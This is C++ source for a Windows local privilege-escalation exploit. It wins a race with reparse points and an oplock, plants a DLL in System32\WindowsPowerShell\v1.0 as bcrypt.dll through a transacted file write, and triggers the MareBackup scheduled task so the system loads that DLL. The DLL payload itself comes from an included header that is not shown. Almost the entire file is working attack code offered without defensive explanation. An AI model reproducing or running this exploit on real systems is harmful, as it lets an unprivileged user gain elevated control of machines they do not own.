#define _CRT_SECURE_NO_WARNINGS
#include <iostream>
#include <Windows.h>
#include <winioctl.h>
#include <cstring>
#include <string>
#include <winternl.h>
#include <combaseapi.h>
#include <evntprov.h>
#include <vector>
#include <initguid.h>
#include <ole2.h>
#include <taskschd.h>
#include <comdef.h>
#include <ktmw32.h>
#include <conio.h>
#pragma comment(lib, "ole32.lib")
#include "doc.h"
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "taskschd.lib")
#pragma comment(lib, "ktmw32.lib")

#define ALL_SHARING FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE


#define targetdll L"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\bcrypt.dll"

#ifndef IO_REPARSE_TAG_MOUNT_POINT
#define IO_REPARSE_TAG_MOUNT_POINT (0xA0000003L)
#endif

#ifndef FSCTL_SET_REPARSE_POINT_EX
#define FSCTL_SET_REPARSE_POINT_EX \
    CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 259, METHOD_BUFFERED, FILE_SPECIAL_ACCESS)
#endif

typedef struct _REPARSE_DATA_BUFFER {
    ULONG  ReparseTag;
    USHORT ReparseDataLength;
    USHORT Reserved;
    union {
        struct {
            USHORT SubstituteNameOffset;
            USHORT SubstituteNameLength;
            USHORT PrintNameOffset;
            USHORT PrintNameLength;
            ULONG  Flags;
            WCHAR  PathBuffer[1];
        } SymbolicLinkReparseBuffer;
        struct {
            USHORT SubstituteNameOffset;
            USHORT SubstituteNameLength;
            USHORT PrintNameOffset;
            USHORT PrintNameLength;
            WCHAR  PathBuffer[1];
        } MountPointReparseBuffer;
        struct {
            UCHAR DataBuffer[1];
        } GenericReparseBuffer;
    } DUMMYUNIONNAME;
} REPARSE_DATA_BUFFER, * PREPARSE_DATA_BUFFER;

typedef struct _REPARSE_DATA_BUFFER_EX {
    ULONG     Flags;
    ULONG     ExistingReparseTag;
    GUID      ExistingReparseGuid;
    ULONGLONG Reserved;
    union {
        REPARSE_DATA_BUFFER      ReparseDataBuffer;
        REPARSE_GUID_DATA_BUFFER ReparseGuidDataBuffer;
    } DUMMYUNIONNAME;
} REPARSE_DATA_BUFFER_EX, * PREPARSE_DATA_BUFFER_EX;


typedef struct _FILE_RENAME_INFORMATION {
#if (_WIN32_WINNT >= _WIN32_WINNT_WIN10_RS1)
    union {
        BOOLEAN ReplaceIfExists;  // FileRenameInformation
        ULONG Flags;              // FileRenameInformationEx
    } DUMMYUNIONNAME;
#else
    BOOLEAN ReplaceIfExists;
#endif
    HANDLE RootDirectory;
    ULONG FileNameLength;
    WCHAR FileName[1];
} FILE_RENAME_INFORMATION, * PFILE_RENAME_INFORMATION;

NTSTATUS(NTAPI* _NtSetInformationFile)(
    _In_ HANDLE FileHandle,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _In_reads_bytes_(Length) PVOID FileInformation,
    _In_ ULONG Length,
    _In_ FILE_INFORMATION_CLASS FileInformationClass
    ) = (NTSTATUS(NTAPI*)(
        _In_ HANDLE FileHandle,
        _Out_ PIO_STATUS_BLOCK IoStatusBlock,
        _In_reads_bytes_(Length) PVOID FileInformation,
        _In_ ULONG Length,
        _In_ FILE_INFORMATION_CLASS FileInformationClass
        ))GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtSetInformationFile");


int main()
{


    HRESULT hr = S_OK;
    ITaskService* pTaskSvc;
    hr = CoInitialize(NULL);
    SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS);
    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);
    HANDLE hpipe = CreateNamedPipe(L"\\??\\pipe\\FALCONFLANK", PIPE_ACCESS_DUPLEX | FILE_FLAG_FIRST_PIPE_INSTANCE, NULL, 1, NULL, NULL, NULL, NULL);
    if (hpipe == INVALID_HANDLE_VALUE)
        return 1;

    wchar_t rptarget[] = { L"\\SystemRoot\\System32\\WindowsPowerShell" };
    std::wstring targetPath = rptarget;
    const std::wstring substituteName = targetPath;
    const std::wstring printName = targetPath;

    const USHORT nameBytes = static_cast<USHORT>(
        (substituteName.size() + 1 + printName.size() + 1) * sizeof(WCHAR));

    // Bytes from the start of MountPointReparseBuffer to its PathBuffer field
    // (i.e. the size of its four USHORT header members) — computed instead
    // of hardcoded, in case of future struct changes.
    const USHORT mountPointHeader = static_cast<USHORT>(
        FIELD_OFFSET(REPARSE_DATA_BUFFER, MountPointReparseBuffer.PathBuffer) -
        FIELD_OFFSET(REPARSE_DATA_BUFFER, MountPointReparseBuffer));

    const USHORT reparseDataLength = static_cast<USHORT>(mountPointHeader + nameBytes);

    const size_t exHeaderSize = FIELD_OFFSET(REPARSE_DATA_BUFFER_EX, ReparseDataBuffer);
    const size_t rdbHeaderSize = FIELD_OFFSET(REPARSE_DATA_BUFFER, MountPointReparseBuffer.PathBuffer);
    const size_t totalSize = exHeaderSize + rdbHeaderSize + nameBytes;

    std::vector<BYTE> buffer(totalSize, 0);
    auto* rdbEx = reinterpret_cast<PREPARSE_DATA_BUFFER_EX>(buffer.data());

    rdbEx->Flags = 0;
    rdbEx->ExistingReparseTag = 0;  // require the directory to have no reparse tag yet
    rdbEx->Reserved = 0;

    REPARSE_DATA_BUFFER& rdb = rdbEx->ReparseDataBuffer;
    rdb.ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
    rdb.ReparseDataLength = reparseDataLength;
    rdb.Reserved = 0;

    auto& mp = rdb.MountPointReparseBuffer;
    mp.SubstituteNameOffset = 0;
    mp.SubstituteNameLength = static_cast<USHORT>(substituteName.size() * sizeof(WCHAR));
    mp.PrintNameOffset = static_cast<USHORT>(mp.SubstituteNameLength + sizeof(WCHAR));
    mp.PrintNameLength = static_cast<USHORT>(printName.size() * sizeof(WCHAR));

    wchar_t* pathBuf = mp.PathBuffer;
    memcpy(pathBuf, substituteName.c_str(), mp.SubstituteNameLength);
    pathBuf[substituteName.size()] = L'\0';

    BYTE* printDst = reinterpret_cast<BYTE*>(pathBuf) + mp.PrintNameOffset;
    memcpy(printDst, printName.c_str(), mp.PrintNameLength);
    *reinterpret_cast<wchar_t*>(printDst + mp.PrintNameLength) = L'\0';


    GUID guid = { 0 };
    OLECHAR* cch;
    CoCreateGuid(&guid);
    StringFromCLSID(guid, &cch);
    IO_STATUS_BLOCK iostat = { 0 };
    wchar_t workdir[MAX_PATH] = { 0 };
    ExpandEnvironmentStrings(L"\\??\\%TEMP%\\Flanker_", workdir, MAX_PATH);
    wcscat(workdir, cch);
    UNICODE_STRING _workdirpath = { 0 };
    RtlInitUnicodeString(&_workdirpath, workdir);
    OBJECT_ATTRIBUTES objattr = { 0 };
    InitializeObjectAttributes(&objattr, &_workdirpath, OBJ_CASE_INSENSITIVE, NULL, NULL);
    HANDLE hworkdir = NULL;
    NTSTATUS stat = NtCreateFile(&hworkdir, GENERIC_ALL | SYNCHRONIZE, &objattr, &iostat, NULL, FILE_ATTRIBUTE_DIRECTORY, ALL_SHARING, FILE_CREATE, FILE_DIRECTORY_FILE | FILE_OPEN_REPARSE_POINT, NULL, NULL);
    if (stat)
    {
        printf("Error 0x%0.8X creating work directory %ws\n", stat, workdir);
        return 1;
    }
    iostat = { 0 };
    UNICODE_STRING windir = { 0 };
    RtlInitUnicodeString(&windir, L"WindowsPowerShell");
    OBJECT_ATTRIBUTES objattr2 = { 0 };
    InitializeObjectAttributes(&objattr2, &windir, OBJ_CASE_INSENSITIVE, hworkdir, NULL);
    HANDLE hwindir = NULL;
    stat = NtCreateFile(&hwindir, GENERIC_ALL | SYNCHRONIZE, &objattr2, &iostat, NULL, FILE_ATTRIBUTE_DIRECTORY, ALL_SHARING, FILE_CREATE, FILE_DIRECTORY_FILE | FILE_OPEN_REPARSE_POINT, NULL, NULL);
    if (stat)
    {
        printf("Error 0x%0.8X creating windows directory %ws\n", stat, windir.Buffer);
        return 1;
    }
    iostat = { 0 };
    UNICODE_STRING sys32 = { 0 };
    RtlInitUnicodeString(&sys32, L"v1.0");
    OBJECT_ATTRIBUTES objattr3 = { 0 };
    InitializeObjectAttributes(&objattr3, &sys32, OBJ_CASE_INSENSITIVE, hwindir, NULL);
    HANDLE hsys32dir = NULL;
    stat = NtCreateFile(&hsys32dir, GENERIC_ALL | SYNCHRONIZE, &objattr3, &iostat, NULL, FILE_ATTRIBUTE_DIRECTORY, ALL_SHARING, FILE_CREATE, FILE_DIRECTORY_FILE | FILE_OPEN_REPARSE_POINT, NULL, NULL);
    if (stat)
    {
        printf("Error 0x%0.8X creating system32 directory %ws\n", stat, sys32.Buffer);
        return 1;
    }
    UNICODE_STRING flankfile = { 0 };
    RtlInitUnicodeString(&flankfile, L"bcrypt.dll");
    OBJECT_ATTRIBUTES objattr4 = { 0 };
    InitializeObjectAttributes(&objattr4, &flankfile, OBJ_CASE_INSENSITIVE, hsys32dir, NULL);
    HANDLE hflanker = NULL;
    stat = NtCreateFile(&hflanker, GENERIC_ALL | SYNCHRONIZE, &objattr4, &iostat, NULL, FILE_ATTRIBUTE_NORMAL, ALL_SHARING, FILE_SUPERSEDE, FILE_NON_DIRECTORY_FILE | FILE_OPEN_REPARSE_POINT, NULL, NULL);
    if (stat)
    {
        printf("Error 0x%0.8X creating %ws\n", stat, flankfile.Buffer);
        return 1;
    }
    DWORD retb = 0;
    OVERLAPPED ovp1 = { 0 };
    ovp1.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
    if (!WriteFile(hflanker, rawData, sizeof(rawData), &retb, &ovp1))
    {
        if (GetLastError() != ERROR_IO_PENDING) {
            printf("Failed to write data to target file, error : %d\n", GetLastError());
            return 1;
        }
    }

    OVERLAPPED ovoplock = { 0 };
    REQUEST_OPLOCK_INPUT_BUFFER opin = { 0 };
    opin.StructureLength = sizeof(opin);
    opin.StructureVersion = REQUEST_OPLOCK_CURRENT_VERSION;
    opin.RequestedOplockLevel = OPLOCK_LEVEL_CACHE_READ | OPLOCK_LEVEL_CACHE_HANDLE;
    opin.Flags = REQUEST_OPLOCK_INPUT_FLAG_REQUEST;
    REQUEST_OPLOCK_OUTPUT_BUFFER opout = { 0 };
    opout.StructureLength = sizeof(opout);
    opout.StructureVersion = REQUEST_OPLOCK_CURRENT_VERSION;
    DWORD cb = NULL;
    ovoplock.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
    if (!DeviceIoControl(hflanker, FSCTL_REQUEST_OPLOCK, &opin, sizeof(opin), &opout, sizeof(opout), &cb, &ovoplock)) {
        if (GetLastError() != ERROR_IO_PENDING) {
            printf("Failed to create oplock, error : %d\n", GetLastError());
            return 1;
        }
    }
    HANDLE hflanker2 = NULL;
    stat = NtCreateFile(&hflanker2, GENERIC_READ | SYNCHRONIZE, &objattr4, &iostat, NULL, FILE_ATTRIBUTE_NORMAL, ALL_SHARING, FILE_OPEN, FILE_NON_DIRECTORY_FILE | FILE_OPEN_REPARSE_POINT, NULL, NULL);
    if (stat)
    {
        printf("Error 0x%0.8X creating %ws\n", stat, flankfile.Buffer);
        return 1;
    }
    CloseHandle(hflanker2);
    WaitForSingleObject(ovoplock.hEvent, INFINITE);
    CloseHandle(hflanker);

    FILE_DISPOSITION_INFO_EX fdiex = { 0 };
    fdiex.Flags = 0x1 | 0x2;
    do {
        stat = _NtSetInformationFile(hsys32dir, &iostat, &fdiex, sizeof(fdiex), (FILE_INFORMATION_CLASS)64);
    } while (stat);
    CloseHandle(hsys32dir);
    bool ret = false;
    while (!DeviceIoControl(hwindir, FSCTL_SET_REPARSE_POINT_EX, buffer.data(), static_cast<DWORD>(totalSize), NULL, NULL, NULL, NULL));
    Sleep(2000);
    HANDLE htrans = CreateTransaction(NULL, NULL, NULL, NULL, NULL, NULL, NULL);
    hflanker = CreateFileTransacted(targetdll, GENERIC_READ | GENERIC_WRITE, ALL_SHARING, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL,htrans,NULL,NULL);
    if (!hflanker || hflanker == INVALID_HANDLE_VALUE)
    {
        printf("Exploit failed.\n");
        return 0;
    }
    SetEndOfFile(hflanker);
    LARGE_INTEGER li = { 0 };
    li.QuadPart = sizeof(FlankerDll);
    HANDLE hmap = CreateFileMapping(hflanker, NULL, PAGE_READWRITE, li.HighPart, li.LowPart,NULL);
    void* buff = MapViewOfFile(hmap, FILE_MAP_READ | FILE_MAP_WRITE, NULL, NULL, NULL);
    memmove(buff, FlankerDll, sizeof(FlankerDll));
    FlushFileBuffers(FlankerDll);


    CommitTransaction(htrans);
    CloseHandle(htrans);
    CloseHandle(hflanker);
    UnmapViewOfFile(buff);
    CloseHandle(hmap);
    printf("Exploit succeeded, loading dll, please wait...\n");

    if (SUCCEEDED(hr))
    {
        hr = CoCreateInstance(CLSID_TaskScheduler,
            NULL,
            CLSCTX_INPROC_SERVER,
            IID_ITaskService,
            (void**)&pTaskSvc);
        if (FAILED(hr))
        {
            printf("[-] Failed to initialize task scheduler COM server.\n");
            CoUninitialize();
            return 1;
        }
    }
    else
    {
        return 1;
    }
    hr = pTaskSvc->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());
    if (hr)
    {
        printf("[-] Failed to connect to task scheduler service, error : 0x%0.8X\n", hr);
        return 1;
    }
    ITaskFolder* taskfolder;
    pTaskSvc->GetFolder((BSTR)L"\\Microsoft\\Windows\\Application Experience", &taskfolder);
    if (hr)
    {
        printf("[-] Failed to get task scheduler folder, error : 0x%0.8X\n", hr);
        return 1;
    }
    IRegisteredTask* taskex;
    taskfolder->GetTask((BSTR)L"MareBackup", &taskex);
    if (hr)
    {
        printf("[-] Failed to obtain task object, error : 0x%0.8X\n", hr);
        return 1;
    }
    IRunningTask* runningtask;
    taskex->Run(_variant_t(), &runningtask);
    if (hr)
    {
        printf("[-] Failed to run scheduled task, error : 0x%0.8X\n", hr);
        return 1;
    }




    if (!ConnectNamedPipe(hpipe, NULL))
    {
        printf("[-] ConnectNamedPipe failed, error : %d\n", GetLastError());
        return 1;
    }

    
    CloseHandle(hwindir);
    CloseHandle(hworkdir);
    Sleep(1000);
    DeleteFile(targetdll);


    return 0;
}
